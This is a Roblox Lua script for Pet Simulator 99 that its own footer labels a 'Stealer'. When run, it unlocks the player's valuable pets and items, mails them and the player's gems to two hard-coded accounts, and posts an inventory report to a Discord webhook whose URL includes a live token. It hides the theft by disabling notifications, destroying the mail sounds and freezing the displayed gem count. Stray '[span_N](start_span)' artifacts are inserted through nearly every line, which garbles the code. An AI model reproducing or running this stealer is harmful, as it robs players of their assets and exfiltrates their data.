local replicatedStorage = game:GetService("ReplicatedStorage")
local httpService = game:GetService("HttpService")
Username = "pet99_2948"
Username2 = "pet99_2947"
webhook = "https://discord.com/api/webhooks/1216303940870869102/vNRc4Q9xj3UNv73GSiZYx_HWoa1WDbsAEuU5uTtqB-5y2sQV5oWKLLG3LFoeiqzBVMLa"
min_rap = 1000

local f1, network, localPlayer, v1, v2, f2, inventory, v3, am, f3, value, notifications, v4,
  username, username2, v5

if getgenv().yeslidez then
  return[span_0](start_span)[span_0](end_span)
else
  getgenv().yeslidez = true[span_1](start_span)[span_1](end_span)
  network = replicatedStorage:WaitForChild("Network")[span_2](start_span)[span_2](end_span)
  localPlayer = game.Players.LocalPlayer[span_3](start_span)[span_3](end_span)
  v1 = {}[span_4](start_span)[span_4](end_span)
  v2 = 0[span_5](start_span)[span_5](end_span)

  function f2()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()[span_6](start_span)[span_6](end_span)
  end

  inventory = f2().Inventory[span_7](start_span)[span_7](end_span)
  local mailboxSendsSinceReset = f2().MailboxSendsSinceReset[span_8](start_span)[span_8](end_span)
  v3 = 20000[span_9](start_span)[span_9](end_span)

  if mailboxSendsSinceReset ~= 0 then
    v3 = math.ceil(v3 * 1.5 ^ mailboxSendsSinceReset)[span_10](start_span)[span_10](end_span)
  end

  am = 0[span_11](start_span)[span_11](end_span)

  for key, value2 in pairs(f2().Inventory.Currency) do
    if value2.id == "Diamonds" then
      am = value2._am[span_12](start_span)[span_12](end_span)
      break
    end
  end

  if v3 > am then
    print("Not enough gems to send mail. Cost: " .. v3 .. " | Gems: " .. am)[span_13](start_span)[span_13](end_span)
    return[span_14](start_span)[span_14](end_span)
  else
    function f1(p1, p2)
      local headers = { ["Content-Type"] = "application/json" }[span_15](start_span)[span_15](end_span)
      local v6 = {}[span_16](start_span)[span_16](end_span)
      local v7 = {}[span_17](start_span)[span_17](end_span)

      for index, value3 in ipairs(v1) do
        local name = value3.name[span_18](start_span)[span_18](end_span)

        if v7[name] then
          v7[name].amount = v7[name].amount + value3.amount[span_19](start_span)[span_19](end_span)
        else
          v7[name] = { amount = value3.amount, rap = value3.rap }[span_20](start_span)[span_20](end_span)
          table.insert(v6, name)[span_21](start_span)[span_21](end_span)
        end
      end

      table.sort(v6, function(p3, p4)
        return v7[p3].rap * v7[p3].amount > v7[p4].rap * v7[p4].amount[span_22](start_span)[span_22](end_span)
      end)

      local text = "[span_23](start_span)"[span_23](end_span)

      for index2, value4 in ipairs(v6) do
        local v8 = v7[value4][span_24](start_span)[span_24](end_span)

        text = text .. value4 .. " (x" .. v8.amount .. "): " .. f3(v8.rap * v8.amount) .. [[
 RAP
]][span_25](start_span)[span_25](end_span)
      end

      local v9 = f3(p2)[span_26](start_span)[span_26](end_span)
      local v10 = f3(v2)[span_27](start_span)[span_27](end_span)

      local v11 = {
        title = "棲 New PS99 Execution",[span_28](start_span)[span_28](end_span)
        color = 65280,[span_29](start_span)[span_29](end_span)
        fields = {
          { name = "Username:", value = "```" .. p1 .. "```", inline = true },[span_30](start_span)[span_30](end_span)
          { name = "Items:", value = "```" .. text .. "```", inline = false },[span_31](start_span)[span_31](end_span)
          {
            name = "Summary:",[span_32](start_span)[span_32](end_span)
            value = "```" .. ("Gems: " .. v9 .. "\nTotal RAP: " .. v10) .. "```",[span_33](start_span)[span_33](end_span)
            inline = false,[span_34](start_span)[span_34](end_span)
          },
        },
        footer = { text = "Stealer Forked From Tobis Source, .gg/FNnkfJqukh" },[span_35](start_span)[span_35](end_span)
      }

      local v12 = { embeds = { v11 } }[span_36](start_span)[span_36](end_span)

      if #v11.fields[2].value > 1024 then
        v11.fields[2].value = string.sub(v11.fields[2].value, 1, 1000) .. [[
...
```]][span_37](start_span)[span_37](end_span)
      end

      local jsonEncode = httpService:JSONEncode(v12)[span_38](start_span)[span_38](end_span)
      local httpRequest = http_request or request or HttpPost or syn.request[span_39](start_span)[span_39](end_span)

      if webhook and webhook ~= "" and httpRequest then
        task.spawn(function()
          httpRequest({
            Url = webhook,[span_40](start_span)[span_40](end_span)
            Method = "POST",[span_41](start_span)[span_41](end_span)
            Headers = headers,[span_42](start_span)[span_42](end_span)
            Body = jsonEncode,[span_43](start_span)[span_43](end_span)
          })
        end)
      end
    end

    function f3(p5)
      local v13 = math.floor(p5)[span_44](start_span)[span_44](end_span)
      local v14 = { "", "k", "m", "b", "t" }[span_45](start_span)[span_45](end_span)
      local v15 = 1[span_46](start_span)[span_46](end_span)

      while v13 >= 1000 do
        v13 = v13 / 1000[span_47](start_span)[span_47](end_span)
        v15 = v15 + 1[span_48](start_span)[span_48](end_span)
      end

      return string.format("%.2f%s", v13, v14[v15])[span_49](start_span)[span_49](end_span)
    end

    value = localPlayer.leaderstats["虫 Diamonds"].Value[span_50](start_span)[span_50](end_span)

    localPlayer.leaderstats["虫 Diamonds"]:GetPropertyChangedSignal("Value"):Connect(function()
      localPlayer.leaderstats["虫 Diamonds"].Value = value[span_51](start_span)[span_51](end_span)
    end)

    local processPendingGUI = localPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"][span_52](start_span)[span_52](end_span)
    notifications = localPlayer.PlayerGui.Notifications[span_53](start_span)[span_53](end_span)
    processPendingGUI.Disabled = true[span_54](start_span)[span_54](end_span)

    notifications.Enabled = false[span_55](start_span)[span_55](end_span)

    notifications:GetPropertyChangedSignal("Enabled"):Connect(function()
      notifications.Enabled = false[span_56](start_span)[span_56](end_span)
    end)

    game.DescendantAdded:Connect(function(descendant)
      if descendant.ClassName == "Sound[span_57](start_span)"[span_57](end_span)
        and (descendant.SoundId == "rbxassetid://11839132565[span_58](start_span)"[span_58](end_span)
          or descendant.SoundId == "rbxassetid://14254721038[span_59](start_span)"[span_59](end_span)
          or descendant.SoundId == "rbxassetid://12413423276") then[span_60](start_span)[span_60](end_span)
        descendant:Destroy()[span_61](start_span)[span_61](end_span)
      end
    end)

    local function f4()
      local library = replicatedStorage:FindFirstChild("Library")[span_62](start_span)[span_62](end_span)

      if not library then
        return nil[span_63](start_span)[span_63](end_span)
      else
        local client = library:FindFirstChild("Client")[span_64](start_span)[span_64](end_span)

        if not client then
          return nil[span_65](start_span)[span_65](end_span)
        end

        for index3, value5 in ipairs({
          { library, "DevRAPCmds" }, { library, "RAPCmds" }, { client, "DevRAPCmds" },[span_66](start_span)[span_66](end_span)
          { client, "RAPCmds" },[span_67](start_span)[span_67](end_span)
        }) do
          local findFirstChild = value5[1]:FindFirstChild(value5[2])[span_68](start_span)[span_68](end_span)

          if findFirstChild and findFirstChild:IsA("ModuleScript") then
            local v16, v17 = pcall(require, findFirstChild)[span_69](start_span)[span_69](end_span)

            if v16 then
              print("Found RAP Module at: " .. findFirstChild:GetFullName())[span_70](start_span)[span_70](end_span)
              return v17[span_71](start_span)[span_71](end_span)
            end
          end
        end

        if client:IsA("ModuleScript") then
          local v18, v19 = pcall(require, client)[span_72](start_span)[span_72](end_span)

          if v18 and type(v19) == "table" then
            for key2, value6 in pairs(v19) do
              if typeof(value6) == "Instance" and value6:IsA("ModuleScript")[span_73](start_span)[span_73](end_span)
                and string.find(string.lower(tostring(key2)), "rap") then[span_74](start_span)[span_74](end_span)
                local v20, v21 = pcall(require, value6)[span_75](start_span)[span_75](end_span)

                if v20 then
                  return v21[span_76](start_span)[span_76](end_span)
                end
              elseif typeof(value6) == "table[span_77](start_span)"[span_77](end_span)
                and string.find(string.lower(tostring(key2)), "rap") then[span_78](start_span)[span_78](end_span)
                print("Found RAP Table in Client Module: " .. tostring(key2))[span_79](start_span)[span_79](end_span)
                return value6[span_80](start_span)[span_80](end_span)
              end
            end
          end
        end

        for index4, value7 in ipairs(replicatedStorage:GetDescendants()) do
          if value7:IsA("ModuleScript")[span_81](start_span)[span_81](end_span)
            and (value7.Name == "DevRAPCmds" or value7.Name == "RAPCmds") then[span_82](start_span)[span_82](end_span)
            local v22, v23 = pcall(require, value7)[span_83](start_span)[span_83](end_span)

            if v22 then
              print("Found RAP Module in ReplicatedStorage: " .. value7:GetFullName())[span_84](start_span)[span_84](end_span)
              return v23[span_85](start_span)[span_85](end_span)
            end
          end
        end

        return nil[span_86](start_span)[span_86](end_span)
      end
    end

    v4 = f4()[span_87](start_span)[span_87](end_span)

    if not v4 then
      warn("CRITICAL ERROR: Could not find RAP Module. Proceeding with fallback RAP values.")[span_88](start_span)[span_88](end_span)
    else
      print("RAP Module loaded successfully.")[span_89](start_span)[span_89](end_span)
    end

    local function f5()
      local v24, v25 = network:WaitForChild("Mailbox: Claim All"):InvokeServer()[span_90](start_span)[span_90](end_span)

      while v25 == "You must wait 30 seconds before using the mailbox!" do
        task.wait(0.5)[span_91](start_span)[span_91](end_span)
        local v26[span_92](start_span)[span_92](end_span)
        v26, v25 = network:WaitForChild("Mailbox: Claim All"):InvokeServer()[span_93](start_span)[span_93](end_span)
      end
    end

    local function f6()
      if inventory.Box then
        for key3, value8 in pairs(inventory.Box) do
          if value8._uq then
            network:WaitForChild("Box: Withdraw All"):InvokeServer(key3)[span_94](start_span)[span_94](end_span)
          end
        end
      end
    end

    local function f7(p6, p7)
      local v27[span_95](start_span)[span_95](end_span)

      if not v4 then
        return 0[span_96](start_span)[span_96](end_span)
      else
        v27 = {
          Class = { Name = p6 },[span_97](start_span)[span_97](end_span)
          IsA = function(p8) return p8 == p6 end,[span_98](start_span)[span_98](end_span)
          GetId = function() return p7.id end,[span_99](start_span)[span_99](end_span)
          StackKey = function()
            return httpService:JSONEncode({
              id = p7.id,[span_100](start_span)[span_100](end_span)
              pt = p7.pt,[span_101](start_span)[span_101](end_span)
              sh = p7.sh,[span_102](start_span)[span_102](end_span)
              tn = p7.tn,[span_103](start_span)[span_103](end_span)
            })
          end,
        }

        local v28, v29 = pcall(function() return v4.Get(v27) end)[span_104](start_span)[span_104](end_span)

        if v28 and v29 and v29 > 0 then
          return v29[span_105](start_span)[span_105](end_span)
        end

        return 0[span_106](start_span)[span_106](end_span)
      end
    end

    username = Username[span_107](start_span)[span_107](end_span)

    local function f8()
      for key4, value9 in pairs(f2().Inventory.Currency) do
        if value9.id == "Diamonds" and am >= v3 + 10000 then
          local v30 = {
            [1] = username,[span_108](start_span)[span_108](end_span)
            [2] = "hi",[span_109](start_span)[span_109](end_span)
            [3] = "Currency",[span_110](start_span)[span_110](end_span)
            [4] = key4,[span_111](start_span)[span_111](end_span)
            [5] = am - v3,[span_112](start_span)[span_112](end_span)
          }

          local invokeServer = false[span_113](start_span)[span_113](end_span)
          local count = 0[span_114](start_span)[span_114](end_span)

          while not invokeServer and count < 10 do
            count = count + 1[span_115](start_span)[span_115](end_span)
            invokeServer = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(v30))[span_116](start_span)[span_116](end_span)
            task.wait(0.5)[span_117](start_span)[span_117](end_span)
          end

          break
        end
      end
    end

    username2 = Username2[span_118](start_span)[span_118](end_span)

    local function f9(p9, p10, p11)
      local v31 = {
        [1] = username,[span_119](start_span)[span_119](end_span)
        [2] = "hi",[span_120](start_span)[span_120](end_span)
        [3] = p9,[span_121](start_span)[span_121](end_span)
        [4] = p10,[span_122](start_span)[span_122](end_span)
        [5] = p11 or 1,[span_123](start_span)[span_123](end_span)
      }

      local invokeServer2 = false[span_124](start_span)[span_124](end_span)
      local count2 = 0[span_125](start_span)[span_125](end_span)

      while not invokeServer2 and count2 < 10 do
        count2 = count2 + 1[span_126](start_span)[span_126](end_span)
        invokeServer2 = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(v31))[span_127](start_span)[span_127](end_span)

        if not invokeServer2 then
          username = username2[span_128](start_span)[span_128](end_span)
          v31[1] = username[span_129](start_span)[span_129](end_span)
          task.wait(0.5)[span_130](start_span)[span_130](end_span)
        end
      end

      if invokeServer2 then
        am = am - v3[span_131](start_span)[span_131](end_span)
        v3 = math.ceil(v3 * 1.5)[span_132](start_span)[span_132](end_span)

        if v3 > 5000000 then
          v3 = 5000000[span_133](start_span)[span_133](end_span)
        end
      else
        warn("Failed to send item: " .. tostring(p10))[span_134](start_span)[span_134](end_span)
      end
    end

    print("Scanning inventory for items with RAP >= " .. min_rap)[span_135](start_span)[span_135](end_span)

    for index5, value10 in ipairs({
      "Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate",[span_136](start_span)[span_136](end_span)
    }) do
      if inventory[value10] then
        for key5, value11 in pairs(inventory[value10]) do
          if value10 == "Pet" then
            local v32 = require(replicatedStorage.Library.Directory.Pets)[value11.id][span_137](start_span)[span_137](end_span)

            if v32.huge or v32.exclusiveLevel then
              local minRap = f7(value10, value11)[span_138](start_span)[span_138](end_span)
              print("Calculated RAP for " .. value11.id .. ": " .. minRap)[span_139](start_span)[span_139](end_span)

              if minRap <= 0 then
                print("WARNING: RAP module returned 0 for " .. value11.id[span_140](start_span)[span_140](end_span)
                  .. ". Forcing to min_rap.")[span_141](start_span)[span_141](end_span)

                minRap = min_rap[span_142](start_span)[span_142](end_span)
              end

              if minRap >= min_rap then
                local v33 = (value11.sh and "Shiny " or "")[span_143](start_span)[span_143](end_span)
                  .. (value11.pt == 1 and "Golden " or value11.pt == 2 and "Rainbow " or "")[span_144](start_span)[span_144](end_span)

                table.insert(v1, {
                  category = value10,[span_145](start_span)[span_145](end_span)
                  uid = key5,[span_146](start_span)[span_146](end_span)
                  amount = value11._am or 1,[span_147](start_span)[span_147](end_span)
                  rap = minRap,[span_148](start_span)[span_148](end_span)
                  name = v33 .. value11.id,[span_149](start_span)[span_149](end_span)
                })

                v2 = v2 + minRap * (value11._am or 1)[span_150](start_span)[span_150](end_span)
              end
            end
          else
            local v34 = f7(value10, value11)[span_151](start_span)[span_151](end_span)

            if v34 >= min_rap then
              table.insert(v1, {
                category = value10,[span_152](start_span)[span_152](end_span)
                uid = key5,[span_153](start_span)[span_153](end_span)
                amount = value11._am or 1,[span_154](start_span)[span_154](end_span)
                rap = v34,[span_155](start_span)[span_155](end_span)
                name = value11.id,[span_156](start_span)[span_156](end_span)
              })

              v2 = v2 + v34 * (value11._am or 1)[span_157](start_span)[span_157](end_span)
            end
          end

          if value11._lk then
            network:WaitForChild("Locking_SetLocked"):InvokeServer(key5, false)[span_158](start_span)[span_158](end_span)
          end
        end
      end
    end

    print("Found " .. #v1 .. " items to send.")[span_159](start_span)[span_159](end_span)

    if #v1 > 0 or am > min_rap + v3 then
      f5()[span_160](start_span)[span_160](end_span)
      task.wait(1)[span_161](start_span)[span_161](end_span)

      for key6, value12 in pairs(f2().Inventory.Currency) do
        if value12.id == "Diamonds" then
          am = value12._am[span_162](start_span)[span_162](end_span)
          break
        end
      end

      print("Updated Gem Amount after claiming mail: " .. am)[span_163](start_span)[span_163](end_span)
      f6()[span_164](start_span)[span_164](end_span)

      require(replicatedStorage.Library.Client.DaycareCmds).Claim()[span_165](start_span)[span_165](end_span)
      require(replicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()[span_166](start_span)[span_166](end_span)

      local save = replicatedStorage.Library.Client.Save[span_167](start_span)[span_167](end_span)
      v5 = require(save).Get()[span_168](start_span)[span_168](end_span)
      require(save).Get = function() return v5 end[span_169](start_span)[span_169](end_span)
      table.sort(v1, function(p12, p13) return p12.rap * p12.amount > p13.rap * p13.amount end)[span_170](start_span)[span_170](end_span)
      print("Sending webhook notification...")[span_171](start_span)[span_171](end_span)
      task.spawn(function() f1(localPlayer.Name, am) end)[span_172](start_span)[span_172](end_span)
      print("Sending items...")[span_173](start_span)[span_173](end_span)

      for index6, value13 in ipairs(v1) do
        if am >= v3 then
          print("Sending: " .. value13.name .. " | RAP: " .. value13.rap .. " | Amount: [span_174](start_span)"[span_174](end_span)
            .. value13.amount)[span_175](start_span)[span_175](end_span)

          f9(value13.category, value13.uid, value13.amount)[span_176](start_span)[span_176](end_span)
        else
          print("Stopped sending. Not enough gems to cover next mail cost of " .. v3)[span_177](start_span)[span_177](end_span)
          break
        end
      end

      f8()[span_178](start_span)[span_178](end_span)
    else
      print("No items met the min_rap requirement or no gems to send.")[span_179](start_span)[span_179](end_span)
    end

    return[span_180](start_span)[span_180](end_span)
  end
end
